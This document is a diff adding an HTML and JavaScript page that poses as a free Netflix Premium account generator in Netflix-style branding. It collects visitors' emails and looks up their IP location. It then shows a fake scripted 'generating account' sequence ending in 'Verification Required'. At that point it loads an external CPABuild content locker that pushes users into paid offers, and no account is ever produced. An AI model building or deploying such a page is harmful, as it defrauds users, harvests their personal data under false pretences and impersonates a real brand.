@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<!-- <link rel="stylesheet" type="text/css" href="./css/style.css"> -->
+	<!-- <link rel="shortcut icon" href="./imgs/netflix.ico" type="image/x-icon" /> -->
+	<title>Get Netflix Premium Account For Free - Netflix Free Generator</title>
+	<style>
+		body {
+			margin: 0;
+			font-family: sans-serif;
+			background: #000000;
+			color: #ffffff;
+			margin-bottom: 120px;
+		}
+
+		button {
+			outline: 0;
+			cursor: pointer;
+		}
+
+		hr {
+			height: 8px;
+			background: #222222;
+			border: 0;
+			margin: 0;
+		}
+
+		.intro {
+			background-image: url(https://i.imgur.com/AjcGmIH.jpg);
+			background-size: cover;
+			width: 100%;
+			height: 620px;
+			position: relative;
+		}
+
+		.intro::before {
+			content: '';
+			position: absolute;
+			top: 0;
+			width: 100%;
+			height: 100%;
+			background: radial-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.9));
+		}
+
+		.intro::after {
+			content: '';
+			position: absolute;
+			background-image: url(https://i.imgur.com/sG5harr.png);
+			width: 130px;
+			height: 35px;
+			background-size: 100%;
+			background-repeat: no-repeat;
+			margin: 26px 0 0 38px;
+			top: 0;
+			left: 0;
+		}
+
+		.intro .content {
+			position: absolute;
+			color: #fff;
+			top: 0;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			margin: auto;
+			width: 55%;
+			height: fit-content;
+			text-align: center;
+		}
+
+		.intro .content h2 {
+			font-size: 47px;
+			width: 82%;
+			text-align: center;
+			margin: auto;
+		}
+
+		.intro .content p {
+			font-size: 22px;
+		}
+
+		.intro .content p:last-child {
+			font-size: 18px;
+		}
+
+		.form {
+			height: 60px;
+			position: relative;
+		}
+
+		.form.has-error {
+			margin-bottom: 40px;
+		}
+
+		.form .error {
+			color: #ffa00a;
+			/*text-shadow: 0 0 1px #f13c3c;*/
+			position: absolute;
+			bottom: -25px;
+			/*text-transform: capitalize;*/
+		}
+
+		.form input {
+			font-size: 16px;
+			height: 60px;
+			width: calc(60% - 20px);
+			border: 0;
+			border-radius: 0;
+			outline: 0;
+			padding: 0 0 0 20px;
+			position: absolute;
+			left: 0;
+		}
+
+		.form .get {
+			font-size: 24px;
+			text-transform: uppercase;
+			position: absolute;
+			right: 0;
+			height: 100%;
+			width: 40%;
+			border: 0;
+			background: #E30813;
+			color: #fff;
+			border-radius: 0;
+		}
+
+		.form .get:before {
+			content: 'Get it free >';
+		}
+
+		.form .get.loading {
+			opacity: 0.8;
+		}
+
+		.form .get.loading::before {
+			content: '';
+			width: 28px;
+			height: 28px;
+			border-top: 3px solid #f2f2f2;
+			position: absolute;
+			top: 0;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			margin: auto;
+			border-radius: 50%;
+			animation: loading 0.7s infinite linear;
+		}
+
+		@keyframes loading {
+			0% {
+				transform: rotate(0deg);
+			}
+
+			100% {
+				transform: rotate(360deg);
+			}
+		}
+
+		.head-button {
+			background: #E30813;
+			color: #fff;
+			position: absolute;
+			border: 0;
+			padding: 9px 14px;
+			border-radius: 4px;
+			right: 30px;
+			top: 26px;
+			font-size: 17px;
+		}
+
+
+		.Cards,
+		.intro {
+			border-bottom: 8px solid #222222;
+		}
+
+
+		.Cards {
+			display: flex;
+			justify-content: space-evenly;
+			align-items: center;
+			padding: 28px 0 34px;
+		}
+
+		.Cards.WatchOffline {
+			flex-direction: row-reverse;
+		}
+
+		.Cards h1 {
+			font-size: 35px;
+		}
+
+		.Cards h2 {
+			font-weight: 100;
+			font-size: 26px;
+		}
+
+		.Cards .Card-Text {
+			width: 35%;
+		}
+
+		.Cards .Card-Image img {
+			max-width: 550px;
+			width: 90%;
+		}
+
+		.guide {
+			text-align: center;
+			padding: 50px 0;
+		}
+
+		.guide h1 {
+			text-transform: capitalize;
+		}
+
+		.guide ul {
+			width: 50%;
+			margin: auto;
+			list-style: none;
+			text-align: left;
+			padding: 0;
+		}
+
+		.guide li {
+			background: #222;
+			padding: 16px;
+			font-size: 20px;
+			margin: 6px 0;
+		}
+
+		.guide li h2 {
+			margin: 0 0 6px 0;
+			font-size: 20px;
+		}
+
+		.guide li p {
+			margin: 0;
+			font-size: 13px;
+			padding-left: 30px;
+		}
+
+		.FormBellow {
+			width: 55%;
+			margin: 60px auto;
+		}
+
+		/*///////////////// PAGE ACTION /////////////////*/
+		.page-action {
+			width: 100%;
+			min-height: 100%;
+			background: #ffffff;
+			color: #000000;
+			position: fixed;
+			overflow: auto;
+			top: 0;
+			z-index: 9;
+			/* display: none;*/
+		}
+
+		.Head-Pa {
+			width: 100%;
+			height: 80px;
+			background-image: url(../imgs/logo.webp);
+			background-size: 122px;
+			background-repeat: no-repeat;
+			background-position: center;
+			box-shadow: 0 0 4px 2px rgba(0, 0, 0, 0.1);
+		}
+
+		.Content-Pa {
+			width: 66%;
+			margin: auto;
+			position: absolute;
+			left: 0;
+			right: 0;
+			padding-bottom: 80px;
+		}
+
+		.Content-Pa .Int {
+			padding: 30px 0;
+		}
+
+		.plansGrid {
+			width: 100%;
+			position: relative;
+			height: 145px;
+		}
+
+		.plansGrid_sections {
+			width: 100%;
+			position: absolute;
+			right: 0;
+			display: flex;
+			justify-content: flex-end;
+		}
+
+		.plansGrid .basic,
+		.plansGrid .standard,
+		.plansGrid .premium {
+			cursor: pointer;
+		}
+
+		table.PlansFeatures {
+			width: 100%;
+		}
+
+		table.PlansFeatures .spec {
+			font-weight: bold;
+		}
+
+		table.PlansFeatures .plansGrid div {
+			width: 130px;
+			height: 120px;
+			background: #E50914;
+			margin: auto;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			color: #ffffff;
+			text-transform: capitalize;
+			opacity: 0.5;
+		}
+
+		table.PlansFeatures .plansGrid .active {
+			opacity: 1;
+		}
+
+		table.PlansFeatures .plansGrid .active:after {
+			content: '';
+			width: 20px;
+			height: 20px;
+			background: #E50914;
+			transform: rotate(45deg);
+			position: absolute;
+			bottom: 12px;
+		}
+
+		table.PlansFeatures {
+			border-collapse: collapse;
+			margin: 10px 0 28px;
+		}
+
+		table.PlansFeatures tr {
+			border-bottom: 1px solid #c3c3c3;
+		}
+
+		table.PlansFeatures tr:last-child {
+			border-bottom: 0px;
+		}
+
+		table.PlansFeatures tr.free .basic,
+		table.PlansFeatures tr.free .standard,
+		table.PlansFeatures tr.free .premium {
+			font-weight: 600;
+		}
+
+		table.PlansFeatures tr td {
+			width: 170px;
+			text-align: center;
+			color: #a6a6a6;
+			padding: 22px 0;
+			position: relative;
+			text-transform: capitalize;
+		}
+
+		table.PlansFeatures tr td:nth-child(1) {
+			width: 43%;
+			text-align: left;
+			color: #000000;
+		}
+
+		table.PlansFeatures tr.plansGrid {
+			border: 0;
+		}
+
+
+		table.PlansFeatures .no:after,
+		table.PlansFeatures .no:before {
+			content: '';
+			width: 20px;
+			height: 1px;
+			border-bottom: 1px solid;
+			position: absolute;
+			left: 0;
+			right: 0;
+			margin: auto;
+		}
+
+		table.PlansFeatures .active {
+			color: #E50914;
+		}
+
+		table.PlansFeatures .no:before {
+			transform: rotate(45deg);
+		}
+
+		table.PlansFeatures .no:after {
+			transform: rotate(-45deg);
+		}
+
+
+		table.PlansFeatures .yes:before {
+			content: '';
+			width: 7px;
+			height: 20px;
+			border: 1px solid;
+			position: absolute;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			margin: auto;
+			border-top: 0;
+			border-left: 0;
+			transform: rotate(45deg);
+		}
+
+		.page-action .legal {
+			color: #737373;
+			font-size: 13px;
+		}
+
+		.page-action .continue {
+			outline: 0;
+			cursor: pointer;
+			width: 50%;
+			margin: auto;
+			text-align: center;
+			align-items: center;
+			display: flex;
+			justify-content: center;
+			color: #ffffff;
+			background: #E50914;
+			border: 0;
+			padding: 12px;
+			text-transform: uppercase;
+			font-size: 17px;
+			position: relative;
+			top: 16px;
+		}
+
+		.page-action .continue:hover {
+			background: #f6121d;
+		}
+
+		.page-action .offers {
+			opacity: 1;
+			visibility: visible;
+			transition: 0.3s;
+		}
+
+		.page-action iframe {
+			position: absolute;
+			top: 0;
+			z-index: 9999;
+			height: 80%;
+			left: 0;
+			bottom: 0;
+			right: 0;
+			margin: 80px auto 0;
+		}
+
+		/*//////////// LOADING ///////////*/
+		/*.Content-Pa{
+	display: none;
+}*/
+		.loading-action,
+		.finish-action {
+			width: 100%;
+			height: 80%;
+			text-align: center;
+			margin: auto;
+			padding: 50px 0;
+			display: none;
+		}
+
+		.loading-action .loading {
+			width: 120px;
+			height: 120px;
+			border-top: 6px solid #D81F26;
+			margin: 60px auto;
+			border-radius: 50%;
+			animation: loading 0.7s infinite linear;
+		}
+
+		.loading-action .loading:before {
+			content: '';
+			width: 60px;
+			hyphens: 10px;
+			position: absolute;
+		}
+
+		.loading-action .process {
+			padding-top: 55px;
+			text-transform: capitalize;
+			display: inline-flex;
+		}
+
+		.loading-action .process p {
+			margin: 0px 8px;
+			text-transform: lowercase;
+		}
+
+		.loading-action .plan {
+			/* margin: 60px auto; */
+			width: 120px;
+			height: 110px;
+			background: #D81F26;
+			color: #fff;
+			font-weight: 600;
+			margin: 70px auto;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			position: relative;
+			text-transform: capitalize;
+		}
+
+		.flag {
+			width: 32px;
+			height: 32px;
+			margin: 0 4px 0 8px;
+			position: relative;
+			top: -2px;
+		}
+
+		.finish-action h2 {
+			margin: 34px;
+		}
+
+		.finish-action ul.TP {
+			margin: 60px;
+			list-style: none;
+			font-size: smaller;
+			color: #666;
+			padding: 0;
+		}
+
+		.finish-action ul.TP li {
+			padding: 12px;
+		}
+
+		.congratulations {
+			width: 100px;
+			height: 100px;
+			background: #49C73C;
+			border-radius: 50%;
+			position: relative;
+			margin: auto;
+			margin-bottom: 40px;
+			margin-top: 20px;
+			left: 0;
+			right: 0;
+		}
+
+		.congratulations:before {
+			content: '';
+			width: 50px;
+			height: 8px;
+			background: #fff;
+			position: absolute;
+			left: 10px;
+			right: 0;
+			top: 3px;
+			bottom: 0;
+			margin: auto;
+			border-radius: 10px;
+			transform: rotate(-45deg);
+		}
+
+		.congratulations:after {
+			content: '';
+			width: 24px;
+			height: 8px;
+			background: #fff;
+			position: absolute;
+			left: -34px;
+			right: 0;
+			top: 22px;
+			bottom: 0;
+			margin: auto;
+			border-radius: 10px;
+			transform: rotate(45deg);
+		}
+
+		/*.loading-action .plan:before{
+    content: '';
+    width: 120px;
+    height: 110px;
+    background: #D81F26;
+    color: #fff;
+    font-weight: 600;
+    justify-content: center;
+    position: absolute;
+    left: 0;
+    right: 0;
+    margin: auto;
+    z-index: 99;
+}*/
+		.loading-action .plan:after {
+			content: '';
+			width: 136px;
+			height: 126px;
+			background: #ffffff;
+			background: linear-gradient(135deg, rgba(255, 255, 255, 0) 0, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, .7) 50%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);
+			background-size: 290% 250%;
+			background-position: 120% 50%;
+			animation: 1.6s animation ease-in-out infinite;
+			color: #fff;
+			font-weight: 600;
+			justify-content: center;
+			position: absolute;
+			left: -3px;
+			right: 0;
+			margin: auto;
+			z-index: 9;
+		}
+
+		.loading-action .plan p {
+			position: absolute;
+			z-index: 99;
+			margin: auto;
+			color: #fff;
+			font-weight: 600;
+		}
+
+		@keyframes animation {
+			0% {
+				background-position: 120% 50%;
+			}
+
+			60% {
+				background-position: -20% 50%;
+			}
+
+			100% {
+				background-position: -20% 50%;
+			}
+		}
+
+		.cpaBuildShow {
+			background-color: transparent;
+			top: 120px;
+			position: absolute;
+		}
+
+		/*/////////////////// RESPONSIVE ///////////////////*/
+		@media (max-width: 1088px) {
+			.Cards {
+				text-align: center;
+				display: block;
+				padding: 28px 18px 34px 18px;
+			}
+
+			.Cards.WatchOffline {
+				flex-direction: unset;
+			}
+
+			.Cards .Card-Text {
+				width: 88%;
+				margin: auto;
+			}
+
+			.intro .content {
+				top: 60px;
+				width: 95%;
+			}
+
+			.Content-Pa {
+				width: 90%;
+			}
+
+			table.PlansFeatures .plansGrid div {
+				width: 80%;
+				height: 75px;
+			}
+
+			table.PlansFeatures .plansGrid .active:after {
+				bottom: 26px;
+			}
+
+		}
+
+		@media (max-width: 900px) {
+			.guide ul {
+				width: 80%;
+			}
+
+			.FormBellow {
+				width: 80%;
+			}
+
+			.form {
+				margin: auto;
+				height: unset;
+				text-align: center;
+			}
+
+			.form input {
+				width: calc(100% - 20px);
+				position: relative;
+			}
+
+			.form .get {
+				font-size: 14px;
+				height: unset;
+				padding: 12px 16px;
+				border-radius: 4px;
+				width: unset;
+				margin-top: 14px;
+				position: relative;
+			}
+
+			table.PlansFeatures tr {
+				flex-wrap: wrap;
+				-webkit-box-align: center;
+				display: flex;
+				text-align: center;
+			}
+
+			table.PlansFeatures .plansGrid div {
+				width: 80%;
+			}
+
+			table.PlansFeatures .plansGrid .active:after {
+				bottom: 12px;
+			}
+
+			table.PlansFeatures tr.plansGrid td:nth-child(1) {
+				display: none;
+			}
+
+			table.PlansFeatures tr td:nth-child(1) {
+				width: 100%;
+				text-align: center;
+			}
+
+			table.PlansFeatures tr td {
+				width: 33.33%;
+				height: fit-content;
+			}
+
+
+
+		}
+	</style>
+</head>
+
+<body>
+	<div class="intro">
+		<div class="content">
+			<h2>Get Free Netflix Account</h2>
+			<p>Unlimited movies, TV shows, and more.</p>
+			<!-- <p>Watch anywhere. Cancel anytime.</p> -->
+			<div class="form">
+				<input type="email" name="email" placeholder="Email address" />
+				<button class="get"></button>
+			</div>
+			<p>Ready to watch? Enter your email to create or restart your membership.</p>
+		</div>
+		<button class="head-button">How it works?</button>
+	</div>
+
+
+
+
+	<div class="Cards WatchOnTv">
+		<div class="Card-Text">
+			<h1>Enjoy on your TV.</h1>
+			<h2>Watch on Smart TVs, Playstation, Xbox, Chromecast, Apple TV, Blu-ray players, and more.</h2>
+		</div>
+		<div class="Card-Image">
+			<img src="https://i.imgur.com/jJhoyxb.png" />
+		</div>
+	</div>
+
+
+
+	<div class="Cards WatchOffline">
+		<div class="Card-Text">
+			<h1>Download your shows to watch offline.</h1>
+			<h2>Save your favorites easily and always have something to watch.</h2>
+		</div>
+		<div class="Card-Image">
+			<img src="https://i.imgur.com/KXBxcjC.jpg" />
+		</div>
+	</div>
+
+
+
+	<div class="Cards WatchEverywhere">
+		<div class="Card-Text">
+			<h1>Watch everywhere.</h1>
+			<h2>Stream unlimited movies and TV shows on your phone, tablet, laptop, and TV without paying more.</h2>
+		</div>
+		<div class="Card-Image">
+			<img src="https://i.imgur.com/XbSJihP.jpg" />
+		</div>
+	</div>
+
+
+
+	<div class="guide">
+		<h1>How to get Netflix Premium for free?</h1>
+		<ul>
+			<li>
+				<h2>1 - Input your email.</h2>
+				<p>Enter the email where we will send you the login information.</p>
+			</li>
+			<li>
+				<h2>2 - Select the plan.</h2>
+				<p>You can select any premium plan for free.</p>
+			</li>
+			<li>
+				<h2>3 - Enjoy</h2>
+				<p>Your Netflix Premium account is ready!</p>
+			</li>
+		</ul>
+	</div>
+	<div class="FormBellow">
+		<div class="form">
+			<input type="email" name="" placeholder="Email address" />
+			<button class="get"></button>
+		</div>
+		<p>Ready to watch? Enter your email to create or restart your membership.</p>
+	</div>
+
+	<div class="page-action" style="display: none;">
+		<div class="Head-Pa"></div>
+		<div class="Content-Pa">
+			<div class="Int">
+				<h2>Choose the plan that’s right for you.</h2>
+				<p>Downgrade or upgrade at any time.</p>
+			</div>
+
+			<table class="PlansFeatures">
+				<tr class="plansGrid">
+					<td>
+						<div id="basic" class="basic">basic</div>
+					</td>
+					<td>
+						<div id="standard" class="standard">standard</div>
+					</td>
+					<td>
+						<div id="premium" class="premium active">Premium</div>
+					</td>
+				</tr>
+				<tr class="free">
+					<td>First 12 months price</td>
+					<td class="basic">free</td>
+					<td class="standard">free</td>
+					<td class="premium active">free</td>
+				</tr>
+				<tr>
+					<td>Monthly price after free 12 months</td>
+					<td class="basic">7,99$</td>
+					<td class="standard">10,99$</td>
+					<td class="premium active">13,99$</td>
+				</tr>
+				<tr>
+					<td>HD available</td>
+					<td class="basic no"></td>
+					<td class="standard yes"></td>
+					<td class="premium yes active"></td>
+				</tr>
+				<tr>
+					<td>Ultra HD available</td>
+					<td class="basic no"></td>
+					<td class="standard no"></td>
+					<td class="premium yes active"></td>
+				</tr>
+				<tr>
+					<td>Screens you can watch on at the same time</td>
+					<td class="basic">1</td>
+					<td class="standard">2</td>
+					<td class="premium active">4</td>
+				</tr>
+				<tr>
+					<td>Watch on your laptop, TV, phone and tablet</td>
+					<td class="basic yes"></td>
+					<td class="standard yes"></td>
+					<td class="premium yes active"></td>
+				</tr>
+				<tr>
+					<td>Unlimited movies and TV shows</td>
+					<td class="basic yes"></td>
+					<td class="standard yes"></td>
+					<td class="premium yes active"></td>
+				</tr>
+				<tr>
+					<td>Cancel anytime</td>
+					<td class="basic yes"></td>
+					<td class="standard yes"></td>
+					<td class="premium yes active"></td>
+				</tr>
+				<!-- <tr>
+	    		<td>First year free</td>
+	    		<td class="basic yes"></td>
+	    		<td class="standard yes"></td>
+	    		<td class="premium yes active"></td></tr> -->
+			</table>
+			<p class="legal">HD and Ultra HD availability subject to your Internet service and device capabilities. Not
+				all content available in HD or Ultra HD. See Terms of Use for more details.</p>
+			<button class="continue">continue</button>
+		</div>
+		<div class="loading-action">
+			<h2>Processing</h2>
+			<div class="loading"></div>
+			<h2 class="process">Loading</h2>
+		</div>
+	</div>
+
+
+
+
+	<script type="text/javascript">
+		var CPABUILDSETTINGS = { "it": 966717, "key": "7b405" };
+	</script>
+	<script src="https://d13nu0oomnx5ti.cloudfront.net/2dd2c15.js"></script>
+
+	<!-- <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script> -->
+	<script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<script type="text/javascript">
+
+
+		$('.get').click(function () {
+			$this = $(this);
+			$this.addClass('loading');
+			form = $this.parents('.form');
+			value = form.find('input').val();
+			form.find('.error').remove();
+			if (value == '') {
+				form.addClass('has-error');
+				form.append('<div class="error">Email is required.</div>');
+				$this.removeClass('loading');
+			} else {
+				$.ajax({
+					url: 'https://isitarealemail.com/api/email/validate?email=' + value,
+					success: function (data) {
+						status = data.status;
+						if (status == 'invalid') {
+							form.addClass('has-error');
+							form.append('<div class="error">You entered an invalid email. Please enter your real email.</div>');
+							$this.removeClass('loading');
+						} else {
+							setTimeout(function () {
+								$('body').css('overflow', 'hidden');
+								$('.page-action').fadeIn();
+								email = form.find('input[name="email"]').val();
+							}, 1500);
+						}
+					}
+				})
+			}
+
+
+
+			/*
+					if(!value.includes('@') || !value.includes('.') ){
+						form.find('.error').remove();
+						form.addClass('has-error');
+						form.append('<div class="error">You entered an invalid email format.</div>');
+					}else if (value !== '') {
+						form.removeClass('has-error').find('.error').remove();
+						$this.addClass('loading');
+						setTimeout(function(){
+							$('body').css('overflow','hidden');
+							$('.page-action').fadeIn();
+							email = form.find('input[name="email"]').val();
+						},1500);
+					}else{
+						form.find('.error').remove();
+						form.addClass('has-error');
+						form.append('<div class="error">Email is required.</div>');
+					}*/
+
+		})
+		$(".head-button").click(function () {
+			$('html, body').animate({
+				scrollTop: $(".guide").offset().top
+			}, 1000);
+		});
+
+		$('.basic,.standard,.premium').click(function () {
+			plan = '.' + $(this).attr('class');
+			['no', 'yes', 'planGrid', ' ', 'active'].forEach(word => {
+				if (plan.indexOf(word) >= 0) {
+					//alert(word);
+					plan = plan.replace(word, '');
+				}
+			})
+			['no', 'yes', 'planGrid', ' ', 'active'].forEach(word => {
+				if (plan.indexOf(word) >= 0) {
+					//alert(word);
+					plan = plan.replace(word, '');
+				}
+			});
+			$('.Content-Pa').find('.active').removeClass('active');
+			$('.Content-Pa').find(plan).addClass('active');
+		})
+
+		$('.Content-Pa .continue').click(function () {
+			t = $(this).parents('.Content-Pa');
+			CPlan = t.find('.plansGrid .active').attr('id');
+			$('.loading-action').show();
+			t.hide();
+			action();
+
+		})
+		function action() {
+			$.ajax({
+				/*url: 'https://api.myip.com/',
+				url: 'https://freegeoip.app/json/',*/
+				url: 'https://ip.nf/me.json',
+				success: function (data) {
+					ip = data.ip.ip;
+					city = data.ip.city;
+					country = data.ip.country;
+					country_code = data.ip.country_code;
+					Vprocess = {
+						"0": { "msg": "Loading", "time": "500" },
+						"1": { "msg": "Unpacking assets", "time": "1800" },
+						"2": { "msg": "Unpacking netflix.pkg", "time": "800" },
+						"3": { "msg": "Searching for closest server", "time": "2000" },
+						"4": { "msg": "Connecting to Server in: <img class='flag' src='https://countryflagsapi.com/svg/" + country_code + "'> " + country, "time": "3000" },
+						"5": { "msg": "Genarating email and password", "time": "3000" },
+						"6": { "msg": "Selecting the Plan", "time": "5000" },
+						"7": { "msg": "Plan Selected!", "time": "1000" },
+						"8": { "msg": "Saving Results...", "time": "1000" },
+						"9": { "msg": "Unusually high traffic from: " + data.ip.country, "time": "2500" },
+						"10": { "msg": "Verification Required", "time": "1000" }
+					};
+
+
+				}
+			})
+			//////////////////////// AFTER AJAX COMPLETE //////////////////////
+			$(document).ajaxStop(function () {
+				c = 0;
+				function changingStatus() {
+					//if (c == 10) {	return;   }
+					$('.loading-action .process').html(Vprocess[c]['msg']);
+
+					if (c == 6) {
+						$('.loading-action .loading').hide().after('<div class="plan"><p>' + CPlan + '</p></div>');
+						setTimeout(function () {
+							$('.loading-action .plan').remove();
+							$('.loading-action .loading').show();
+						}, 6000);
+					}
+					//if (c == 4) {// CONNECTNG TO SERVER
+					//	return;
+					//       $('.loading-action .process').append("<img id=\"flag\" src='https://www.countryflags.io/"+country_code+"/flat/32.png'> "+country);
+					//}
+					c++;
+					changeInterval();
+
+				}
+
+				var Interval = setInterval(changingStatus, 500);
+
+				function CPABuildComplete() {
+					$('.loading-action').fadeOut();
+					$('.loading-action').after('<div class="finish-action"></div>').remove();
+					finish = $('.finish-action');
+					finish.prepend('<div class="congratulations"></div>');
+					finish.append('<h2>Congratulations! Your account is ready to use</h2>');
+					finish.append('<p>We have sent an email to ' + email + ' containing the login information for your account.</p>');
+					finish.append('<ul class="TP"><li>Watch unlimited Movies & TV Shows</li><li>One account for all your devices</li><li>Download the free netflix app</li></ul>');
+					finish.fadeIn();
+				}
+
+				function changeInterval() {
+					clearInterval(Interval);
+					if (typeof Vprocess[c] !== 'undefined') {
+						Interval = setInterval(changingStatus, Vprocess[c - 1]['time']);
+						//Interval = setInterval(changingStatus, 100);
+					} else {
+						$("#CPABUILD_MODAL_CONTAINER").appendTo(".page-action");
+						$("#CPABUILD_MODAL").css(
+							{
+								'background': 'transparent',
+								'top': '120px',
+								'position': 'absolute',
+								'opacity': '0',
+								'visibility': 'hidden',
+								'transition': '0.4s'
+							});
+						$("#CPABUILD_MODAL").addClass('CPABUILD_MODAL');
+						CPABuildLock();
+						//CPABuildComplete();
+
+
+						setTimeout(function () {
+							$("#CPABUILD_MODAL").css({ 'opacity': '1', 'visibility': 'visible' });
+						}, 3500);
+
+						/* setTimeout(function(){
+							 $('.page-action .offers').removeAttr('style');
+						 },3000);*/
+					}
+				}
+			});
+		}
+
+
+
+
+	</script>
+
+
+</body>
+
+<footer>
+
+</footer>
+
+</html>
